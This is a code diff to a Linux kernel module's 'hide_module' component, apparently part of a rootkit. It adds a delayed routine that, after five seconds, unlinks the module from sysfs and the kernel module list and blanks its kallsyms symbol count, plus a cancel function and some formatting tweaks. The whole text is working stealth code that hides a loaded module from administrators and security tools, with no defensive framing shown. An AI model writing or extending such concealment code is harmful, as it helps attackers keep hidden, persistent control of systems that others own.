@@ -1,6 +1,15 @@
 #include "../include/hide_module.h"
 
+#define MODULE_HIDE_DELAY_MS 5000
+
 static struct module_hider_state hider_state = {0};
+static void module_hide_deferred_work(struct work_struct *work);
+static DECLARE_DELAYED_WORK(hide_work, module_hide_deferred_work);
+
+static void module_hide_deferred_work(struct work_struct *work)
+{
+    module_hide_current();
+}
 
 static void __remove_from_sysfs(struct module *mod)
 {
@@ -9,7 +18,7 @@ static void __remove_from_sysfs(struct module *mod)
     if (kobj && kobj->parent) {
         kobject_del(kobj);
         kobj->parent = NULL;
-        kobj->kset   = NULL;
+        kobj->kset = NULL;
 
         if (mod->holders_dir) {
             kobject_put(mod->holders_dir);
@@ -36,11 +45,8 @@ static void __sanitize_module_info(struct module *mod)
 
 static void __remove_symbols_from_kallsyms(struct module *mod)
 {
-    if (mod->kallsyms) {
+    if (mod->kallsyms)
         mod->kallsyms->num_symtab = 0;
-        // mod->kallsyms->symtab = NULL;
-        // mod->kallsyms->strtab = NULL;
-    }
 }
 
 notrace void module_hide_current(void)
@@ -51,7 +57,7 @@ notrace void module_hide_current(void)
         return;
 
     hider_state.saved_list_pos = mod->list.prev;
-    hider_state.saved_parent   = mod->mkobj.kobj.parent;
+    hider_state.saved_parent = mod->mkobj.kobj.parent;
 
     __remove_from_sysfs(mod);
     __remove_from_module_list(mod);
@@ -59,6 +65,17 @@ notrace void module_hide_current(void)
     __remove_symbols_from_kallsyms(mod);
 
     hider_state.hidden = true;
+}
+
+notrace void module_hide_current_deferred(void)
+{
+    if (!hider_state.hidden)
+        schedule_delayed_work(&hide_work, msecs_to_jiffies(MODULE_HIDE_DELAY_MS));
+}
+
+notrace void module_hide_cancel_deferred(void)
+{
+    cancel_delayed_work_sync(&hide_work);
 }
 
 notrace bool module_is_hidden(void)
